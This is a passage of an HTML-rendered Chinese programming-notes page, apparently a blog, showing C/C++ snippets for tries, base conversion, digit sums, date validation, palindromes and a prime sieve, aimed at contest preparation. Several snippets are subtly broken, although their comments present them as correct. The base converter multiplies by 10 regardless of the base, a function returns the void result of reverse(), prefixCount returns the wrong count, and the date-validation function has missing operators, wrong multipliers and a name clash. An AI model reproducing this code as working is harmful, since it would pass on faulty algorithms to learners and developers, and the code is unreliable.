class="hljs-number">0</span> &amp;&amp; len % t == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The period of the string is: %d\n&quot;</span>, t);  <span class="hljs-comment">// 输出最小周期</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The string does not have a period.\n&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">1000</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>    <span class="hljs-type">int</span> n = <span class="hljs-built_in">strlen</span>(s);<br>    findMinPeriod(s, n);  <span class="hljs-comment">// 查找最小周期</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Trie字符串"><a href="#Trie字符串" class="headerlink" title="Trie字符串"></a>Trie字符串</h3><p>假设我们插入以下字符串：apple app banana appl app</p><p><strong>插入 “apple”</strong>:</p><p>Root -&gt; a -&gt; p -&gt; p -&gt; l -&gt; e (cnt: 1)</p><p><strong>插入 “app”</strong>:</p><p>Root -&gt; a -&gt; p -&gt; p (cnt: 2)<br>                      -&gt; l -&gt; e (cnt: 1)</p><p><strong>插入 “banana”</strong>:</p><p>Root -&gt; a -&gt; p -&gt; p (cnt: 2)<br>                      -&gt; l -&gt; e (cnt: 1)<br>      -&gt; b -&gt; a -&gt; n -&gt; a -&gt; n -&gt; a (cnt: 1)</p><p><strong>插入 “appl”</strong>:</p><p>Root -&gt; a -&gt; p -&gt; p (cnt: 2)<br>                      -&gt; l -&gt; e (cnt: 1)<br>                            -&gt; l (cnt: 1)<br>      -&gt; b -&gt; a -&gt; n -&gt; a -&gt; n -&gt; a (cnt: 1)</p><p><strong>插入 “app”</strong>:</p><p>Root -&gt; a -&gt; p -&gt; p (cnt: 3)<br>                      -&gt; l -&gt; e (cnt: 1)<br>                            -&gt; l (cnt: 1)<br>      -&gt; b -&gt; a -&gt; n -&gt; a -&gt; n -&gt; a (cnt: 1)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> son[N][<span class="hljs-number">26</span>], cnt[N], idx;  <span class="hljs-comment">// Trie树的结构：儿子节点数组 son，单词计数数组 cnt，当前节点索引 idx</span><br><br><span class="hljs-comment">// 插入一个字符串</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span><br>&#123;<br>    <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 从根节点开始</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; str[i]; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u = str[i] - <span class="hljs-string">&#x27;a&#x27;</span>;  <span class="hljs-comment">// 转换字符为对应的数组索引</span><br>        <span class="hljs-keyword">if</span> (!son[p][u]) son[p][u] = ++idx;  <span class="hljs-comment">// 如果该子节点不存在，则新建节点</span><br>        p = son[p][u];  <span class="hljs-comment">// 跳到该子节点</span><br>    &#125;<br>    cnt[p]++;  <span class="hljs-comment">// 更新以该节点结尾的单词数量</span><br>&#125;<br><br><span class="hljs-comment">// 查询字符串出现的次数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">query</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span><br>&#123;<br>    <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 从根节点开始</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; str[i]; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u = str[i] - <span class="hljs-string">&#x27;a&#x27;</span>;  <span class="hljs-comment">// 转换字符为对应的数组索引</span><br>        <span class="hljs-keyword">if</span> (!son[p][u]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 如果没有对应的子节点，说明该字符串不存在</span><br>        p = son[p][u];  <span class="hljs-comment">// 跳到该子节点</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> cnt[p];  <span class="hljs-comment">// 返回以该节点结尾的单词数量，即该字符串的出现次数</span><br>&#125;<br><br><span class="hljs-comment">// 前缀匹配，返回以 prefix 为前缀的单词数量</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prefixCount</span><span class="hljs-params">(<span class="hljs-type">char</span> *prefix)</span><br>&#123;<br>    <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 从根节点开始</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; prefix[i]; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u = prefix[i] - <span class="hljs-string">&#x27;a&#x27;</span>;  <span class="hljs-comment">// 转换字符为对应的数组索引</span><br>        <span class="hljs-keyword">if</span> (!son[p][u]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 如果没有对应的子节点，说明没有这个前缀</span><br>        p = son[p][u];  <span class="hljs-comment">// 跳到该子节点</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> cnt[p];  <span class="hljs-comment">// 返回该节点及其子树的单词数量</span><br>&#125;<br><br><span class="hljs-comment">// 自动补全，返回所有以 prefix 为前缀的单词</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">autoComplete</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-built_in">string</span> prefix)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (cnt[p] &gt; <span class="hljs-number">0</span>)  <span class="hljs-comment">// 如果这个节点结尾有单词</span><br>        <span class="hljs-built_in">cout</span> &lt;&lt; prefix &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)  <span class="hljs-comment">// 遍历所有可能的字母</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (son[p][i])  <span class="hljs-comment">// 如果有子节点</span><br>        &#123;<br>            autoComplete(son[p][i], prefix + <span class="hljs-type">char</span>(i + <span class="hljs-string">&#x27;a&#x27;</span>));  <span class="hljs-comment">// 递归生成单词</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">1000</span>];<br><br>    <span class="hljs-comment">// 插入一些单词</span><br>    insert(<span class="hljs-string">&quot;apple&quot;</span>);<br>    insert(<span class="hljs-string">&quot;app&quot;</span>);<br>    insert(<span class="hljs-string">&quot;banana&quot;</span>);<br>    insert(<span class="hljs-string">&quot;bat&quot;</span>);<br>    insert(<span class="hljs-string">&quot;ball&quot;</span>);<br><br>    <span class="hljs-comment">// 查询字符串出现的次数</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;apple count: &quot;</span> &lt;&lt; query(<span class="hljs-string">&quot;apple&quot;</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 结果应该是 1</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;app count: &quot;</span> &lt;&lt; query(<span class="hljs-string">&quot;app&quot;</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;      <span class="hljs-comment">// 结果应该是 1</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;banana count: &quot;</span> &lt;&lt; query(<span class="hljs-string">&quot;banana&quot;</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 结果应该是 1</span><br><br>    <span class="hljs-comment">// 前缀匹配，返回前缀为 &quot;ba&quot; 的单词数量</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Prefix &#x27;ba&#x27; count: &quot;</span> &lt;&lt; prefixCount(<span class="hljs-string">&quot;ba&quot;</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 结果应该是 3 (banana, bat, ball)</span><br><br>    <span class="hljs-comment">// 自动补全，输入 &quot;ba&quot; 后，输出所有以 &quot;ba&quot; 开头的单词</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Auto-complete for &#x27;ba&#x27;: &quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    autoComplete(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;ba&quot;</span>);  <span class="hljs-comment">// 输出 &quot;banana&quot;, &quot;bat&quot;, &quot;ball&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="二十二-数学知识"><a href="#二十二-数学知识" class="headerlink" title="二十二.数学知识"></a>二十二.数学知识</h2><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">calc</span><span class="hljs-params">(<span class="hljs-type">char</span> c)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;9&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">10</span> + c - <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> c - <span class="hljs-string">&#x27;0&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-type">int</span> k, string s)</span> </span>&#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        ans = ans * <span class="hljs-number">10</span> + <span class="hljs-built_in">calc</span>(s[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//这段代码的目的是将一个整数 x 转换为基数 k（即进制）表示的字符串。</span><br><br><span class="hljs-function">string <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    string ans = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">// 初始化空字符串，用于存储转换结果</span><br>    <span class="hljs-keyword">while</span> (x != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">int</span> t = x % k; <span class="hljs-comment">// 计算 x 对 k 取余，得到当前位的值</span><br><br>        <span class="hljs-comment">// 如果余数小于10，直接将其转为字符并追加到结果字符串</span><br>        <span class="hljs-keyword">if</span> (t &lt;= <span class="hljs-number">9</span>) &#123;<br>            ans = ans + (<span class="hljs-type">char</span>)(<span class="hljs-string">&#x27;0&#x27;</span> + t); <span class="hljs-comment">// &#x27;0&#x27; + t 转为对应数字字符</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 如果余数大于9，表示是 A, B, C, ..., Z 等表示 (例如10为A, 11为B等)</span><br>            ans = ans + (<span class="hljs-type">char</span>)(<span class="hljs-string">&#x27;A&#x27;</span> + (t - <span class="hljs-number">10</span>)); <span class="hljs-comment">// &#x27;A&#x27; + (t - 10) 转为对应字符</span><br>        &#125;<br>        x = x / k; <span class="hljs-comment">// 更新 x，除以 k</span><br>    &#125;<br><br>    <span class="hljs-comment">// 将结果字符串反序并返回，reverse 是反转字符串的标准操作</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(), ans.<span class="hljs-built_in">end</span>());<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//这段代码的功能是统计从 1 到 2024 之间符合特定条件的数字的个数。一个数字在二进制下和四进制下的各位数字之和相等。</span><br><br><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-comment">// 计算x在b进制下的各位数字之和</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sumB</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> b)</span> &#123;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (x) &#123;<br>        sum = sum + x % b;  <span class="hljs-comment">// 获取x在b进制下的当前位，并加到sum</span><br>        x = x / b;  <span class="hljs-comment">// 将x除以b，继续处理下一位</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;  <span class="hljs-comment">// 返回各位数字之和</span><br>&#125;<br><br><span class="hljs-comment">// 检查x是否在二进制和四进制下的数字和相等</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> sumB(x, <span class="hljs-number">2</span>) == sumB(x, <span class="hljs-number">4</span>);  <span class="hljs-comment">// 比较二进制和四进制下数字和是否相等</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 用来记录符合条件的数字个数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">2024</span>; i++) &#123;  <span class="hljs-comment">// 从1到2024的每个数字</span><br>        <span class="hljs-keyword">if</span> (check(i)) &#123;  <span class="hljs-comment">// 如果check(i)返回true，说明满足条件</span><br>            ans++;  <span class="hljs-comment">// 满足条件的数字个数+1</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, ans);  <span class="hljs-comment">// 输出符合条件的数字个数</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="日期问题"><a href="#日期问题" class="headerlink" title="日期问题"></a>日期问题</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 每月天数数组，平年默认是28天</span><br><span class="hljs-type">int</span> months[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">31</span>, <span class="hljs-number">28</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>&#125;; <br><span class="hljs-comment">// 对应数字的汉字数组</span><br><span class="hljs-type">int</span> hz[] = &#123;<span class="hljs-number">13</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>&#125;;<br><br><span class="hljs-comment">// 判断闰年函数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">leap</span><span class="hljs-params">(<span class="hljs-type">int</span> year)</span> &#123;<br>    <span class="hljs-comment">// 闰年条件：是400的倍数，或者是4的倍数且不是100的倍数</span><br>    <span class="hljs-keyword">return</span> (year % <span class="hljs-number">400</span> == <span class="hljs-number">0</span>) || (year % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> &amp;&amp; year % <span class="hljs-number">100</span> != <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">// 主逻辑处理函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">solve</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 用来记录符合条件的日期数量</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> year = <span class="hljs-number">2000</span>; year &lt;= <span class="hljs-number">2024</span>; year++) &#123;  <span class="hljs-comment">// 遍历每年</span><br>        <span class="hljs-comment">// 设置当前年份的月份天数</span><br>        <span class="hljs-keyword">if</span> (leap(year)) months[<span class="hljs-number">2</span>] = <span class="hljs-number">29</span>;<br>        <span class="hljs-keyword">else</span> months[<span class="hljs-number">2</span>] = <span class="hljs-number">28</span>;<br><br>        <span class="hljs-comment">// 遍历每月</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> month = <span class="hljs-number">1</span>; month &lt;= <span class="hljs-number">12</span>; month++) &#123;<br>            <span class="hljs-comment">// 遍历每天</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> day = <span class="hljs-number">1</span>; day &lt;= months[month]; day++) &#123;<br>                <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 当天日期的各位数字之和</span><br>                <span class="hljs-type">int</span> y1, y2, y3, y4, m1, m2, d1, d2;  <span class="hljs-comment">// 用来存储年份、月份和日期的各个数字</span><br><br>                y1 = year / <span class="hljs-number">1000</span>;  <span class="hljs-comment">// 年份的千位</span><br>                y2 = year / <span class="hljs-number">100</span> % <span class="hljs-number">10</span>;  <span class="hljs-comment">// 年份的百位</span><br>                y3 = year / <span class="hljs-number">10</span> % <span class="hljs-number">10</span>;  <span class="hljs-comment">// 年份的十位</span><br>                y4 = year % <span class="hljs-number">10</span>;  <span class="hljs-comment">// 年份的个位</span><br>                m1 = month / <span class="hljs-number">10</span>;  <span class="hljs-comment">// 月份的十位</span><br>                m2 = month % <span class="hljs-number">10</span>;  <span class="hljs-comment">// 月份的个位</span><br>                d1 = day / <span class="hljs-number">10</span>;  <span class="hljs-comment">// 日期的十位</span><br>                d2 = day % <span class="hljs-number">10</span>;  <span class="hljs-comment">// 日期的个位</span><br><br>                <span class="hljs-comment">// 计算日期数字和</span><br>                cnt = cnt + hz[y1] + hz[y2] + hz[y3] + hz[y4] + hz[m1] + hz[m2] + hz[d1] + hz[d2];<br>                <br>                <span class="hljs-comment">// 若权值和大于50，计入答案</span><br>                <span class="hljs-keyword">if</span> (cnt &gt; <span class="hljs-number">50</span>) ans++;<br><br>                <span class="hljs-comment">// 若到达2024年4月13日，输出结果并结束</span><br>                <span class="hljs-keyword">if</span> (year == <span class="hljs-number">2024</span> &amp;&amp; month == <span class="hljs-number">4</span> &amp;&amp; day == <span class="hljs-number">13</span>) &#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, ans);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    solve();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>闰年处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">DaysOfMonth</span><span class="hljs-params">(<span class="hljs-type">int</span> y,<span class="hljs-type">int</span> m)</span><span class="hljs-comment">//2月处理 </span><br>&#123;<br><span class="hljs-keyword">if</span>(m==<span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-keyword">return</span> is_leap(y)+<span class="hljs-number">28</span>;<br>&#125;<br><span class="hljs-keyword">return</span> day[m];<br>&#125;<br></code></pre></td></tr></table></figure><p>回文</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">is_pali</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><span class="hljs-comment">//是否回文 </span><br>&#123;<br><span class="hljs-built_in">string</span> str=to_string(x);<br><span class="hljs-built_in">string</span> s=str;<br>reverse(s.begin(),s.end());<br><span class="hljs-keyword">return</span> s==str;<br>&#125;<br></code></pre></td></tr></table></figure><p>abab判断（在回文的前提下）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">is_ab</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><span class="hljs-comment">//abab判断 </span><br>&#123;<br><span class="hljs-built_in">string</span> str=to_string(x);<br><span class="hljs-keyword">return</span> str[<span class="hljs-number">0</span>]==str[<span class="hljs-number">2</span>]&amp;&amp;str[<span class="hljs-number">1</span>]==str[<span class="hljs-number">3</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>日期合法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">is_valid</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><span class="hljs-comment">//日期合法 </span><br>&#123;<br><span class="hljs-built_in">string</span> str=to_string(x);<br>year=(str[<span class="hljs-number">0</span>]<span class="hljs-number">-48</span>)<span class="hljs-number">1000</span>+(str[<span class="hljs-number">1</span>]<span class="hljs-number">-48</span>)<span class="hljs-number">100</span>+(str[<span class="hljs-number">2</span>]<span class="hljs-number">-48</span>)<span class="hljs-number">100</span>+str[<span class="hljs-number">3</span>]<span class="hljs-number">-48</span>;<br>month=(str[<span class="hljs-number">4</span>]<span class="hljs-number">-48</span>)<span class="hljs-number">10</span>+str[<span class="hljs-number">5</span>]<span class="hljs-number">-48</span>;<br>day=str[<span class="hljs-number">6</span>]*<span class="hljs-number">10</span>+str[<span class="hljs-number">7</span>];<br><span class="hljs-keyword">if</span>(month&lt;=<span class="hljs-number">12</span>&amp;&amp;day&lt;=day[month]) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">if</span>(year%<span class="hljs-number">400</span>==<span class="hljs-number">0</span>||year%<span class="hljs-number">100</span>!=<span class="hljs-number">0</span>&amp;&amp;year%<span class="hljs-number">4</span>==<span class="hljs-number">0</span>) <br>&#123;<br><span class="hljs-keyword">if</span>(month==<span class="hljs-number">2</span>&amp;&amp;day==<span class="hljs-number">29</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="线性筛法求质数"><a href="#线性筛法求质数" class="headerlink" title="线性筛法求质数"></a>线性筛法求质数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 